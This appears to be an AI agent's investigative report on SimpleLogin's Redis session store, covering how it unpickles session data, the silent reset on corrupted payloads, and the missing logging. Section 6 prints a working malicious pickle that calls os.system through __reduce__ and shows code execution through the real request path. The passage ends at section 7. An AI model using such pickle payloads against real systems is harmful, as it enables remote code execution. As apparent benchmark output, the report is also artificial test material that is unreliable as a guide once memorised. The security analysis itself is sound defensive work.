# How SimpleLogin's `RedisSessionStore` Deserializes Session Data — and What Happens When the Redis Payload Is Corrupted, Malformed, or Maliciously Tampered With

> **Deliverable:** runtime-grounded investigative answer for the source branch `app_2cd6ee777f8c`.
> **Subject:** the custom Flask `SessionInterface` named `RedisSessionStore(SessionInterface)` in `app/session.py` — the *only* file in the repository that calls `pickle.loads`/`pickle.dumps`.
> **Method:** every behavioral claim below sits next to the **actual, unedited output** of a temporary observation script that exercised the **real** login/logout/request entry points in the canonical Python 3.10 runtime with `RedisSessionStore` active. Every factual claim carries a `file:line` citation and names the exact function/method that performs the work.

---

## TL;DR (one-paragraph answer)

SimpleLogin's server-side session subsystem is a custom Flask `SessionInterface` — `RedisSessionStore` in `app/session.py` — that stores each session's data as a **standard-library `pickle`** blob in Redis under the key `session:<sid>` and identifies it with an `itsdangerous` HMAC-**SHA1**-signed session id carried in the `slapp` cookie. **Deserialization is a single call, `pickle.loads(val)`, in `open_session` at `app/session.py:76`.** When the Redis payload is corrupted or malformed, the *next request* triggers a **silent session reset**: `pickle.loads` raises, a bare `except Exception: pass` at `app/session.py:78-79` swallows the error, and `open_session` falls through to `return ServerSession(session_id=str(uuid.uuid4()))` at `app/session.py:80`. The request does **not** fail and **no** error is surfaced — the user simply appears anonymous and receives a normal `302` redirect to the login page. No session- or pickle-specific line is written to the logs (the module imports no logger, `app/session.py:1-16`), so in the logs the reset is **indistinguishable from a user who was never logged in**. The boundary between a harmless reset and a genuine risk is precise: the *same* code path that harmlessly resets on invalid bytes will **execute arbitrary code** if the attacker-controlled bytes form a *valid, weaponized* pickle whose `__reduce__` returns a callable — the code runs *inside* `pickle.loads` at `app/session.py:76`, **before** the `except` at `:78` can intervene. Finally, the HMAC signature protects **only the session-id pointer** (which Redis key is read; `app/session.py:37-41`), not the integrity of the unsigned pickle payload written by `pickle.dumps(dict(session))` at `app/session.py:91`. Therefore an attacker who can **write to Redis but cannot forge the signed cookie** still reaches `pickle.loads` with attacker-controlled bytes — the victim's own valid, unforged cookie merely points `open_session` at the poisoned key — so being unable to forge the id does **not** meaningfully reduce the risk. This is **CWE-502 (Deserialization of Untrusted Data) / OWASP A08:2021 (Software and Data Integrity Failures)**, closely analogous to the python-socketio advisory **GHSA-g8c6-8fjj-2r4m**; the RCE is contingent on Redis write access and is not reachable by a normal web client who can only present a signed cookie.

---

## 1. Investigation method & canonical environment

### 1.1 Read-only discipline

This is a **documentation / knowledge-extraction** task, not a fix. No existing source file was modified; the only artifact added to the repository is this Markdown document. All observation scripts were placed **outside** the repository (under `/tmp`) and removed after the investigation; the repository working tree is clean except for this file (verified in the Appendix). The deserialization risk described here is **explained, not remediated** — remediation is explicitly out of scope.

### 1.2 Canonical runtime

- **Runtime:** Python **3.10.18** — canonical per `Dockerfile` (`FROM python:3.10`), `pyproject.toml` (`python = "^3.10"`), and CI `.github/workflows/main.yml` (`python-version '3.10'`). (The host shell exposes only Python 3.12, so a dedicated 3.10 environment is required to observe canonical behavior.)
- **Canonical image used:** `ghcr.io/scaleapi/swe-atlas:swe_atlas_QnA_simple-login_app_1.0` (digest `sha256:b82cb15631e92ade58b8cf10493550f03a54dc5a8f25d3f31ef41afc186ee2c1`). The Docker Hub image `andrewparkscaleai/coding-agent:simple-login__app__2cd6ee777f8c...` referenced in the environment instructions required authentication (access denied), so the equivalent GHCR image was used. The repository is pre-loaded at `/app`; `git -C /app rev-parse HEAD` = `2cd6ee777f8c2d3531559588bcfb18627ffb5d2c` — the exact source-branch commit.
- **Interpreter / dependency pins** (verified in the image venv `/app/venv`, exact pins from `poetry.lock`): flask **1.1.2**, itsdangerous **1.1.0**, redis **4.6.0**, werkzeug **1.0.1**, flask-login **0.5.0** (also limits 1.5.1, flask-limiter 1.4). No dependency was added, updated, or removed.
- **Backing services (localhost, inside the container):** PostgreSQL reconfigured to port **15432** (role `test`/`test`, database `test`) and Redis **7.0.15**.
  - *Honest, non-behavioral deviation:* canonical CI uses a Redis v6 server, whereas the image ships Redis **7.0.15**. The server-version difference does not affect the `get`/`setex`/`delete` operations or pickle behavior — the pinned **client** `redis==4.6.0` governs the interaction, and the session store only performs `get`/`setex`/`delete` of an opaque byte string.
- **Configuration:** `tests/test.env`, which sets `FLASK_SECRET=secret` (`tests/test.env:20`), `DB_URI=postgresql://test:test@localhost:15432/test` (`tests/test.env:17`), `MEM_STORE_URI=redis://localhost` (`tests/test.env:78`), and `URL=http://localhost` (`tests/test.env:2`). Because `MEM_STORE_URI` is set, `RedisSessionStore` is installed — see the activation guard `if MEM_STORE_URI:` at `server.py:163-165`.

### 1.3 Exact build / run / invocation commands

```bash
docker pull ghcr.io/scaleapi/swe-atlas:swe_atlas_QnA_simple-login_app_1.0
docker run -d --name slinv --entrypoint bash <IMAGE> -lc 'sleep infinity'
# inside the container:
pg_conftool 15 main set port 15432 && pg_ctlcluster 15 main start
redis-server --daemonize yes --save "" --appendonly no
cd /app && CONFIG=tests/test.env /app/venv/bin/alembic upgrade head
# run an observation script (scripts live under /tmp, OUTSIDE the repo):
cd /app && PYTHONPATH=/app CONFIG=tests/test.env /app/venv/bin/python /tmp/<script>.py
```

**App-boot verification.** With `CONFIG=tests/test.env`, `create_app()` yields `app.session_interface = app.session.RedisSessionStore`, `SESSION_COOKIE_NAME = slapp`, `app.secret_key = 'secret'`, and `MEM_STORE_URI = 'redis://localhost'` — i.e. the pickle deserialization path is **active** through the real entry points. (This exact activation state is shown as observed output in §2.1 below.)

### 1.4 Canonical entry points exercised

All behavior was exercised through the **real** entry points — never a bypass or synthetic stand-in:

- **login** — `client.post(url_for("auth.login"), data={"email": ..., "password": "password"}, follow_redirects=True)` → the `login()` view at `app/auth/views/login.py:25`, which on success calls `after_login()` at `app/auth/views/login_utils.py:12` (`login_user()` at `:36`, `session["sudo_time"] = int(time())` at `:37`).
- **authenticated request** — `client.get("/dashboard/")` → routed through `open_session` on the way in and `save_session` on the way out.
- **logout** — `client.get(url_for("auth.logout"))` → the `logout()` view at `app/auth/views/logout.py:9`, which calls `logout_session()` at `:10` and deletes the `slapp`/`mfa`/`dark-mode` cookies at `:13-15`.
- **API logout** — `GET /api/logout` (`app/api/views/user_info.py:131`) calls the **identical** `logout_session()` at `:140`; this path is labeled **verified-by-code-reference (same mechanism as web logout)**, not runtime-exercised (see §7.3).

The scripts mirror the canonical `tests/conftest.py` harness exactly: `os.environ["CONFIG"]=tests/test.env`, `app = create_app()`, `app.config["TESTING"]=True`, `WTF_CSRF_ENABLED=False`, `SERVER_NAME="sl.test"`, the `pg_trgm` extension plus `add_sl_domains()` and `add_proton_partner()`, and a `create_new_user()` (password `"password"`, `tests/utils.py:17`), all wrapped in `connection.begin()` and rolled back at teardown. Redis handles are read from `app.session_interface._redis_r` / `._redis_w`. This is the exact template used by `tests/auth/test_login.py` and `tests/utils.py::login()` (`:46-59`).

### 1.5 A note on logging capture technique

SimpleLogin's `SL` logger writes to the process's **original stdout file descriptor**, established when logging is initialized at import time. Ordinary Python-level stdout redirection (reassigning `sys.stdout`) does **not** intercept it. To observe the logs honestly, §4 uses **OS file-descriptor-level capture**: `os.dup2()` redirects fd 1/fd 2 to a temp file around a single request, then restores them. This guarantees the captured log lines are exactly what the server emitted.

### 1.6 Byte-sensitivity and reproducibility

Byte-sensitive results were **captured, not assumed**: the pickle protocol was read from the emitted bytes (`pickle.DEFAULT_PROTOCOL = 4` on this Python 3.10.18 runtime; every emitted payload begins with `\x80\x04`, the PROTO opcode for protocol 4), and the `itsdangerous` cookie signature was verified by reproducing it with `signer.sign(...)`. All evidence below is the actual, unedited output from the canonical runtime. Per-run values (session ids, signatures, timestamps, user emails, `sudo_time`) differ from run to run, but the structure and behavior are **stable** — verified across roughly a dozen logins spanning multiple runs.

---

## 2. Baseline session lifecycle (login → logout)

This section documents what a "normal" session looks like at runtime: how it is created on login, what is written to Redis, what the signed cookie carries, and how logout tears it down.

### 2.1 Environment / activation (observed)

The following was dumped at the top of the observation script, confirming the pickle path is active and capturing the serializer/signer configuration:

```text
session_interface        = app.session.RedisSessionStore
redis client type        = redis.client.Redis
SESSION_COOKIE_NAME       = slapp
app.secret_key            = 'secret'
MEM_STORE_URI             = 'redis://localhost'
permanent_session_lifetime= 31 days, 0:00:00 -> 2678400 s
pickle.DEFAULT_PROTOCOL   = 4 ; HIGHEST_PROTOCOL = 5
signer                    = itsdangerous.signer.Signer
signer.digest_method      = <built-in function openssl_sha1>
signer.sep                = b'.'
```

**Interpretation (with citations):**

- `app.session_interface` is `app.session.RedisSessionStore`, installed by the *only* `session_interface` assignment in the repository — `app.session_interface = RedisSessionStore(...)` in `initialize_redis_services` at `app/redis_services.py:12`, reached because `MEM_STORE_URI` is set (`server.py:163-165`; `MEM_STORE_URI` defined at `app/config.py:568`).
- `SESSION_COOKIE_NAME = slapp` comes from `SESSION_COOKIE_NAME = "slapp"` at `app/config.py:199`.
- `app.secret_key = 'secret'` comes from `app.secret_key = FLASK_SECRET` at `server.py:151`, sourced from `FLASK_SECRET = os.environ["FLASK_SECRET"]` (`app/config.py:196-198`, with a mandatory non-empty guard) and supplied by `tests/test.env:20`.
- The serializer is stdlib `pickle` at **protocol 4** — on Python 3 the `try: import cPickle as pickle / except ImportError: import pickle` block at `app/session.py:9-12` falls back to the standard-library `pickle`. `pickle.DEFAULT_PROTOCOL = 4` was **captured** here, not assumed.
- The signer is `itsdangerous.signer.Signer` with `digest_method = openssl_sha1` (HMAC-**SHA1**) — constructed by `_get_signer` as `itsdangerous.Signer(app.secret_key, salt="session", key_derivation="hmac")` at `app/session.py:37-41`.

**Important TTL nuance (observed + explained).** The line `permanent_session_lifetime = 31 days` is read **at rest** (module import, outside any request), where it equals Flask's default. During any real request, the `@app.before_request def make_session_permanent()` at `server.py:204-207` sets `app.permanent_session_lifetime = timedelta(days=7)`, and `save_session` reads *that* per-request value at `app/session.py:92`. Hence the authenticated Redis TTL observed below is **604800 s (7 days)**, and an anonymous session's TTL is **300 s** — the `if "_user_id" not in session: ttl = 300` branch at `app/session.py:95-96`. Both the at-rest value (31 days) and the per-request effect (7 days / 300 s) are reported honestly.

### 2.2 Login — `POST auth.login` (observed)

```text
BEFORE login: session:* keys = [] ; slapp cookie = None
login_url = http://sl.test/auth/login ; logout_url = http://sl.test/auth/logout
POST auth.login -> status 200 ; authenticated (b'/auth/logout' in body) = True

slapp cookie (VERBATIM) = '8f611911-0608-4f2a-9ec1-388e904e2216.DAvonP7Zs3x3zQyDk_GYqbT2tgc'
  sid_part = '8f611911-0608-4f2a-9ec1-388e904e2216' (uuid4)
  sig_part = 'DAvonP7Zs3x3zQyDk_GYqbT2tgc'
  signer.unsign(cookie) = '8f611911-0608-4f2a-9ec1-388e904e2216'
  signer.validate(cookie) = True
  RECONSTRUCT signer.sign(sid_part) == emitted cookie ?  True

Redis key                = session:8f611911-0608-4f2a-9ec1-388e904e2216
Redis raw bytes (VERBATIM repr) = b'\x80\x04\x95\xe9\x00\x00\x00\x00\x00\x00\x00}\x94(\x8c\n_permanent\x94\x88\x8c\x06_fresh\x94\x88\x8c\x08_user_id\x94\x8c$1b6bd928-f8c4-4db4-a8e3-34154386ff1b\x94\x8c\x03_id\x94\x8c\x80002d6488725f12795645bdaba13a63a9b9921bd0aa16de790c6d994a21857f46432395eda2feab1f40d0446a4c6940c7d1f55b48d70fe5ba691b1aa8c50c0916\x94\x8c\tsudo_time\x94J\x84\x08Uju.'
first two bytes          = b'\x80\x04' => PROTO opcode 0x80, protocol=4
TTL (setex)              = 604800 s
pickle.loads(raw)        = {'_permanent': True, '_fresh': True, '_user_id': '1b6bd928-f8c4-4db4-a8e3-34154386ff1b', '_id': '002d6488725f12795645bdaba13a63a9b9921bd0aa16de790c6d994a21857f46432395eda2feab1f40d0446a4c6940c7d1f55b48d70fe5ba691b1aa8c50c0916', 'sudo_time': 1783957636}
payload keys (sorted)    = ['_fresh', '_id', '_permanent', '_user_id', 'sudo_time']
pickletools.dis(raw):
    0: \x80 PROTO      4
    2: \x95 FRAME      233
   11: }    EMPTY_DICT
   12: \x94 MEMOIZE    (as 0)
   13: (    MARK
   14: \x8c     SHORT_BINUNICODE '_permanent'
   26: \x94     MEMOIZE    (as 1)
   27: \x88     NEWTRUE
   28: \x8c     SHORT_BINUNICODE '_fresh'
   36: \x94     MEMOIZE    (as 2)
   37: \x88     NEWTRUE
   38: \x8c     SHORT_BINUNICODE '_user_id'
   48: \x94     MEMOIZE    (as 3)
   49: \x8c     SHORT_BINUNICODE '1b6bd928-f8c4-4db4-a8e3-34154386ff1b'
   87: \x94     MEMOIZE    (as 4)
   88: \x8c     SHORT_BINUNICODE '_id'
   93: \x94     MEMOIZE    (as 5)
   94: \x8c     SHORT_BINUNICODE '002d6488725f12795645bdaba13a63a9b9921bd0aa16de790c6d994a21857f46432395eda2feab1f40d0446a4c6940c7d1f55b48d70fe5ba691b1aa8c50c0916'
  224: \x94     MEMOIZE    (as 6)
  225: \x8c     SHORT_BINUNICODE 'sudo_time'
  236: \x94     MEMOIZE    (as 7)
  237: J        BININT     1783957636
  242: u        SETITEMS   (MARK at 13)
  243: .    STOP
highest protocol among opcodes = 4
```

**Interpretation (with citations):**

- **The cookie is `<sid>.<signature>`.** The signature is an `itsdangerous` HMAC-SHA1 MAC over the **session id string only**, keyed by `app.secret_key` with `salt="session"` (`app/session.py:37-41`). Two independent checks prove the signature covers the sid exclusively: `signer.validate(cookie)` returns `True`, and reconstructing `signer.sign(sid_part)` reproduces the emitted cookie **byte-for-byte** (`RECONSTRUCT ... == emitted cookie ? True`). This signing happens in `save_session` — `signed_session_id = self._get_signer(app).sign(itsdangerous.want_bytes(session.session_id))` and `response.set_cookie(...)` at `app/session.py:102-114`.
- **The Redis value is a raw pickle blob.** The key is `session:<sid>` built by `_get_key` (`f"{SESSION_PREFIX}:{session_Id}"`, `SESSION_PREFIX = "session"` at `app/session.py:18`, `app/session.py:43-45`). The value is `pickle.dumps(dict(session))` written by `save_session` at `app/session.py:91` via `self._redis_w.setex(...)` (`app/session.py:97-101`). The captured bytes begin with `\x80\x04` — the PROTO opcode for **protocol 4** — confirming the serializer and protocol from the emitted bytes (verified again by `pickletools.dis`, `highest protocol among opcodes = 4`).
- **The payload dict** is `{_permanent, _fresh, _user_id, _id, sudo_time}`. There is **no `csrf_token`** because the canonical harness sets `WTF_CSRF_ENABLED=False`. `_user_id` is the flask-login user id (`user.get_id()`); `_id` is the flask-login **"strong" session-protection** fingerprint, enabled by `login_manager.session_protection = "strong"` at `app/extensions.py:8`; `sudo_time` is written by `after_login()` at `app/auth/views/login_utils.py:37`.
- **The TTL is 604800 s (7 days)** because `"_user_id"` is present in the session, so the `ttl = 300` branch is *not* taken — `ttl = int(app.permanent_session_lifetime.total_seconds())` with the per-request 7-day lifetime (`app/session.py:92`, `:95-96`; the 7-day value set by `make_session_permanent`, `server.py:204-207`).

### 2.3 Logout — `GET auth.logout` (observed)

```text
session:* keys BEFORE logout = ['session:8f611911-0608-4f2a-9ec1-388e904e2216']
GET auth.logout -> status 302 ; Location = http://sl.test/auth/login
Set-Cookie headers (VERBATIM, in order):
  1) slapp=; Expires=Thu, 01-Jan-1970 00:00:00 GMT; Max-Age=0; Path=/
  2) mfa=; Expires=Thu, 01-Jan-1970 00:00:00 GMT; Max-Age=0; Path=/
  3) dark-mode=; Expires=Thu, 01-Jan-1970 00:00:00 GMT; Max-Age=0; Path=/
  4) slapp=101598c2-033c-4686-ac65-453d15c326ce.ekP3wTaVHtweDqhRjD29KatA5dw; Domain=.sl.test; Expires=Mon, 20-Jul-2026 15:47:16 GMT; HttpOnly; Path=/; SameSite=Lax
redis GET <old authenticated key> AFTER logout = None
session:* keys AFTER logout = ['session:101598c2-033c-4686-ac65-453d15c326ce']
slapp cookie in jar AFTER logout = '101598c2-033c-4686-ac65-453d15c326ce.ekP3wTaVHtweDqhRjD29KatA5dw' (LAST Set-Cookie wins)
```

**Interpretation (with citations):**

- `logout()` (`app/auth/views/logout.py:9-16`) calls `logout_session()` (`app/session.py:117-121`), which calls `logout_user()` then `purge_session()` (`app/session.py:61-66`). `purge_session` **DELETEs** the authenticated Redis key — `self._redis_w.delete(self._get_key(session.session_id))` at `app/session.py:63` — and assigns a fresh `uuid.uuid4()` at `:64`. This is confirmed by `redis GET <old authenticated key> AFTER logout = None`.
- The view then deletes the `slapp`, `mfa`, and `dark-mode` cookies (`app/auth/views/logout.py:13-15`) → **Set-Cookie headers 1–3** (empty value, `Max-Age=0`, epoch expiry).
- **Observed nuance beyond the naïve "just delete it" model:** because `make_session_permanent` runs `before_request` and `save_session` runs on *every* response, a brand-new **empty anonymous** session is immediately persisted and its cookie re-set → **Set-Cookie header 4** (a new signed `slapp` pointing at a new key). Being the *last* `Set-Cookie`, it wins in the client jar, which is why `session:*` after logout shows the new anonymous key and the jar holds the new cookie. The net effect is nonetheless correct: the authenticated payload is destroyed (old key GET = `None`) and the user is anonymous.


---

## 3. Corrupted / malformed payload behavior (the core question)

**Question (b):** on the *next request* after the Redis payload becomes invalid pickle, does the request **fail**, **silently reset** the session, or **surface an error** to the user?

**Answer: silent reset.** The request does not fail and no error is surfaced; the session is silently replaced with a fresh anonymous one, and the user receives a normal `302` redirect to the login page.

### 3.1 Observed — authenticate, corrupt the Redis payload, issue the next real request

```text
BEFORE corruption: authenticated sid = 03175494-312c-45fd-9f9e-3ccc9228d446 ; GET /dashboard/ -> 200 (200=authenticated)
DURING: direct pickle.loads(malformed) RAISES: UnpicklingError: invalid load key, '\x00'.
AFTER (next real GET /dashboard/): status = 302 ; Location = http://sl.test/auth/login?next=%2Fdashboard%2F%3F
  pickle.loads invoked = 1 x ; swallowed exception = UnpicklingError: invalid load key, '\x00'.
  sid CHANGED 03175494-312c-45fd-9f9e-3ccc9228d446 -> 8478d854-b4f9-405b-b31d-2cb89a652369 == SILENT RESET
```

The malformed bytes written to the Redis key were:

```text
b"\x00this is definitely not a valid pickle stream\xff\xfe"
```

The before/during/after state was recorded explicitly:

- **Before:** a genuinely authenticated session (`GET /dashboard/ -> 200`), sid `03175494-...`.
- **During:** calling `pickle.loads` directly on the malformed bytes raises `UnpicklingError: invalid load key, '\x00'.` — proving the bytes are undecodable.
- **After:** the next real `GET /dashboard/` returns `302` to the login page, `pickle.loads` was invoked exactly **once** and its exception was swallowed, and the session id **changed** — a silent reset.

### 3.2 Line-by-line trace of `open_session` (`app/session.py:68-80`)

The crux is the `open_session` method. On the corrupted-payload request it executes as follows:

1. `session_id = self.extract_and_validate_session_id(app, request)` (`app/session.py:69`) — the `slapp` cookie is still validly signed (only the *Redis payload* was corrupted, not the cookie), so this returns the real sid.
2. `if not session_id:` (`:70`) is **false**, so the early fresh-session return at `:71` is skipped.
3. `val = self._redis_r.get(self._get_key(session_id))` (`:73`) — reads the corrupted bytes.
4. `if val is not None:` (`:74`) is **true** (the corrupted value exists).
5. `data = pickle.loads(val)` (`:76`) — **raises** `UnpicklingError` (observed above; `pickle.loads invoked = 1 x`).
6. `except Exception:` (`:78`) catches it; `pass` (`:79`) swallows it silently — no re-raise, no logging.
7. Control falls through to `return ServerSession(session_id=str(uuid.uuid4()))` (`:80`) — a brand-new empty session with a new uuid4 id.

Because the restored session is empty (no `_user_id`), flask-login treats the user as anonymous; the `@login_required` guard on the dashboard then issues the `302` redirect to `/auth/login`. The bare, non-logging `except Exception: pass` at `app/session.py:78-79` is precisely why the failure is **silent**: the deserialization error never propagates to the request handler and never becomes a `500`.


---

## 4. Response & log observability

**Question (c):** what actually appears in the HTTP **response** and in the server **logs** when the reset occurs?

**Answer:** the HTTP response is a normal `302` redirect to `/auth/login` (no error page, no `500`). The logs contain **exactly one** line for the request — the same generic per-request line that is printed for *every* request — with the only difference being the HTTP status code (`302` instead of `200`). There is **no** session/pickle/unpickle/reset/error-specific log line.

### 4.1 The module imports no logging facility (grep proof + import block)

```text
$ grep -nE 'import logging|from .*log|LOG|logger|logging\.' /app/app/session.py
6:from flask_login import logout_user
```

The only match is the substring `log` inside `logout_user`; there is no logger, no `LOG`, no `logging` import anywhere in the module. The full import block is `app/session.py:1-16`:

```python
import uuid
from typing import Optional

import flask
from flask import current_app, session
from flask_login import logout_user


try:
    import cPickle as pickle
except ImportError:
    import pickle

import itsdangerous
from flask.sessions import SessionMixin, SessionInterface
from werkzeug.datastructures import CallbackDict
```

Because `open_session`'s handler is `except Exception: pass` (`app/session.py:78-79`) and the module has no logger, the swallowed deserialization error produces **no log output of its own**.

### 4.2 OS fd-level capture: one NORMAL vs one CORRUPTED→RESET request

Using file-descriptor-level capture (see §1.5), the log output of a single normal authenticated request and a single corrupted→reset request was recorded:

```text
(A) NORMAL authenticated GET /dashboard/ (200) log lines:
    2026-07-13 15:48:46,955 - SL - DEBUG - 521 - "/app/server.py:284" - after_request() -  - 127.0.0.1 GET /dashboard/ ImmutableMultiDict([]) 200, takes 0.04599738121032715
(B) CORRUPTED->RESET GET /dashboard/ (302) log lines:
    2026-07-13 15:48:46,957 - SL - DEBUG - 521 - "/app/server.py:284" - after_request() -  - 127.0.0.1 GET /dashboard/ ImmutableMultiDict([]) 302, takes 0.0003199577331542969
reset-log mentions pickle/unpickl/reset/corrupt/badsignature = False
session.py emitted anything = False
```

**Interpretation (with citations):**

- The reset emits **exactly one** log line, and it is the **same** generic per-request line that `after_request()` (`server.py:284`) prints for **every** request. The only difference from a normal request is the HTTP status: `302` (reset → anonymous → `@login_required` redirect) versus `200` (authenticated).
- There is **no** session-, pickle-, unpickle-, reset-, or `BadSignature`-specific log line — programmatically confirmed by `reset-log mentions pickle/unpickl/reset/corrupt/badsignature = False` and `session.py emitted anything = False`. This follows directly from the swallow-without-logging at `app/session.py:78-79` and the absence of a logger in the module (`app/session.py:1-16`).
- **Consequence:** in the logs, a corrupted-payload reset is **indistinguishable from a user who simply was not logged in**. Both produce the identical `after_request()` line differing only by the `302` status. The HTTP response itself is a normal redirect to the login page — there is no error surfaced to the user or to log-based monitoring.


---

## 5. Edge / error paths

Beyond the corrupted-payload case, three related conditions were exercised through the real path. Each records the number of `pickle.loads` invocations, distinguishing which conditions ever reach the deserializer.

```text
CONDITION 3a - MISSING / EMPTY REDIS VALUE (pickle.loads never reached)
redis.get(key) after delete = None
GET /dashboard/ -> status 302 ; pickle.loads invoked = 0 x  (guard 'if val is not None' short-circuits)
sid reset: a960186e-f2b7-4204-8d63-7f45b1de07d9 -> dbb0acd0-71e9-490d-af06-f7467a817b48

CONDITION 3b - BAD SIGNATURE COOKIE (rejected before Redis/pickle)
good cookie     = 3bccbe4d-cf7a-4d46-90af-36f5a4c279b8.cFVXJV-8mBvuQCcWitJkGUGTDco
tampered cookie = 3bccbe4d-cf7a-4d46-90af-36f5a4c279b8.cFVXJV-8mBvuQCcWitJkGUGTDcA
extract_and_validate_session_id(good)     = 3bccbe4d-cf7a-4d46-90af-36f5a4c279b8
extract_and_validate_session_id(tampered) = None
signer.unsign(tampered) RAISES: BadSignature: Signature b'cFVXJV-8mBvuQCcWitJkGUGTDcA' does not match
request w/ tampered cookie -> status 302 ; pickle.loads invoked = 0 x (sid None -> Redis never read)

CONDITION 3c - TRUNCATED PICKLE (UnpicklingError/EOFError -> caught)
valid payload len = 244 -> truncated to 15 bytes: b'\x80\x04\x95\xe9\x00\x00\x00\x00\x00\x00\x00}\x94(\x8c'
direct pickle.loads(truncated) RAISES: UnpicklingError: pickle data was truncated
through real path GET /dashboard/: status 302 ; loads invoked 1 x ; swallowed = UnpicklingError: pickle data was truncated
sid reset: 9769c278-19a4-40b7-89af-5fe5b78e4dc0 -> 745aa1cc-a98c-47fd-80b1-85ad0f8caf40
```

**Interpretation (with citations):**

- **(3a) Missing / empty Redis value.** After deleting the key, `redis.get(key)` returns `None`, so the `if val is not None:` guard at `app/session.py:74` short-circuits and `pickle.loads` is **never called** (`invoked = 0 x`). `open_session` falls straight through to the fresh-session return at `app/session.py:80`. This is the benign "session expired / evicted" case: a reset with **no deserialization at all**.
- **(3b) `BadSignature` cookie.** Flipping the last character of the signature yields a cookie whose signature no longer matches. `extract_and_validate_session_id` (`app/session.py:47-59`) reads the cookie (`request.cookies.get(app.session_cookie_name)`, `:51`), calls `signer.unsign(...)` (`:56`) which raises `itsdangerous.BadSignature` (`Signature ... does not match`), and the `except itsdangerous.BadSignature: return None` at `:58-59` converts that to `None`. With `session_id is None`, `open_session` returns a fresh session at `:70-71` **without ever reading Redis**, so `pickle.loads invoked = 0 x`. This is the **key contrast**: tampering the *signed id* is detected and rejected **before** any deserialization occurs.
- **(3c) Truncated pickle.** A valid 244-byte payload truncated to its first 15 bytes (`b'\x80\x04\x95\xe9\x00\x00\x00\x00\x00\x00\x00}\x94(\x8c'`) is still recognizable as a protocol-4 pickle header but is incomplete. `pickle.loads` raises `UnpicklingError: pickle data was truncated`, which is caught by the same bare `except Exception: pass` at `app/session.py:78-79` → silent reset (`loads invoked 1 x`, status `302`). This confirms that *any* deserialization failure — invalid opcode or truncation alike — is funneled into the same silent reset.

Taken together, (3a)/(3b) show the two ways `pickle.loads` is **avoided** (no Redis value; rejected signature), while (3c) and §3 show the two ways it is **reached and fails harmlessly** (invalid opcode; truncation).


---

## 6. The boundary: harmless reset vs. genuine deserialization risk

**Question (d):** where exactly is the boundary between a benign session reset (non-malicious malformed bytes) and a genuine deserialization risk (a well-formed *malicious* pickle that executes code during `pickle.loads`)?

**Answer:** the boundary is **not** a different code path — it is the *same* `pickle.loads(val)` at `app/session.py:76`. The only difference is whether the attacker-controlled bytes form a **valid, weaponized** pickle program. Non-malicious corruption raises immediately on an invalid/incomplete opcode → harmless silent reset. A crafted pickle whose `__reduce__` returns a callable executes that callable **during** unpickling → arbitrary code execution, *before* the `except` at `app/session.py:78` can run.

> **Safety note.** The demonstration below is deliberately benign: the malicious pickle's *only* effect is to write a marker file `/tmp/pickle_rce_marker`. No destructive action is taken, and the marker is removed afterward. The RCE is **contingent on Redis write access** (the attacker must be able to overwrite `session:<sid>`); it is not reachable by a normal web client.

### 6.1 The malicious pickle (bytes + disassembly)

The payload is `pickle.dumps(Exploit())` where `Exploit.__reduce__` returns `(os.system, (CMD,))` with `CMD` writing the marker file:

```text
malicious pickle bytes (VERBATIM repr) = b"\x80\x04\x95f\x00\x00\x00\x00\x00\x00\x00\x8c\x05posix\x94\x8c\x06system\x94\x93\x94\x8cKecho 'ARBITRARY-CODE-EXECUTED-INSIDE-pickle.loads' > /tmp/pickle_rce_marker\x94\x85\x94R\x94."
pickletools.dis(malicious):
    0: \x80 PROTO      4
    2: \x95 FRAME      102
   11: \x8c SHORT_BINUNICODE 'posix'
   18: \x94 MEMOIZE    (as 0)
   19: \x8c SHORT_BINUNICODE 'system'
   27: \x94 MEMOIZE    (as 1)
   28: \x93 STACK_GLOBAL
   29: \x94 MEMOIZE    (as 2)
   30: \x8c SHORT_BINUNICODE "echo 'ARBITRARY-CODE-EXECUTED-INSIDE-pickle.loads' > /tmp/pickle_rce_marker"
  107: \x94 MEMOIZE    (as 3)
  108: \x85 TUPLE1
  109: \x94 MEMOIZE    (as 4)
  110: R    REDUCE
  111: \x94 MEMOIZE    (as 5)
  112: .    STOP
highest protocol among opcodes = 4
```

Note the payload begins with the **same `\x80\x04` PROTO-4 header** as a legitimate session payload (compare §2.2). The `STACK_GLOBAL` opcode resolves `posix.system` (i.e. `os.system`), and the `REDUCE` opcode invokes it with the command-string argument **during unpickling**.

### 6.2 Three observed conditions on the identical code path

```text
(1) ISOLATION - direct pickle.loads(payload):
  marker BEFORE = False
  pickle.loads returned = 0 (os.system exit code)
  marker AFTER = True ; content = ARBITRARY-CODE-EXECUTED-INSIDE-pickle.loads

(2) THROUGH REAL open_session PATH (attacker with Redis write):
  login sid = 13a3840b-0ec0-4843-86e4-8b66c6995ccd ; marker BEFORE = False
  GET /dashboard/ -> status 302
  marker AFTER = True => RCE inside pickle.loads at app/session.py:76 BEFORE except at :78

(3) CONTRAST benign malformed bytes (identical code path, NOT weaponized):
  GET /dashboard/ -> status 302 ; marker AFTER = False => NO callable invoked (harmless reset)
```

**Interpretation (with citations):**

- **(1) Isolation.** Calling `pickle.loads` directly on the payload executes the command: the marker did not exist before, `pickle.loads` returns `0` (the `os.system` exit code), and the marker exists afterward with the expected content. This proves the payload is a working RCE primitive.
- **(2) Through the real `open_session` path.** After a *genuine* login, overwriting the victim's Redis payload with the malicious pickle and issuing the next real `GET /dashboard/` causes the marker to be created — the code executed **inside `pickle.loads` at `app/session.py:76`**. The request still returns `302` (after the callable runs, unpickling ultimately produces no valid session dict, so the reset proceeds), but the damage is already done: the attacker's code ran *before* the `except` at `app/session.py:78` could intervene. The `except` only runs *after* `loads` returns or raises — by which point the `REDUCE` opcode has already invoked `os.system`.
- **(3) Benign contrast.** The *same* code path with non-weaponized malformed bytes (`b"\x00not a pickle\xff\xfe"`) raises immediately on the invalid opcode, so **no callable is invoked** (marker not created) → a harmless silent reset, exactly as in §3.

**The boundary, stated precisely:** identical entry point, identical `pickle.loads(val)` at `app/session.py:76`, identical silent-reset epilogue. The *sole* discriminator is whether the attacker-controlled bytes constitute a valid, weaponized pickle program. A non-malicious corruption is a harmless silent reset; a crafted pickle is remote code execution. *(Context, not a recommendation: this is the textbook CWE-502 hazard of unpickling untrusted data — see §7.)*

---

## 7. Threat model: signed session-id *pointer* vs. unsigned pickle *payload*

**Sub-question (e):** *Does an attacker who can tamper with the stored session bytes but cannot forge the signed session id meaningfully change the risk?*

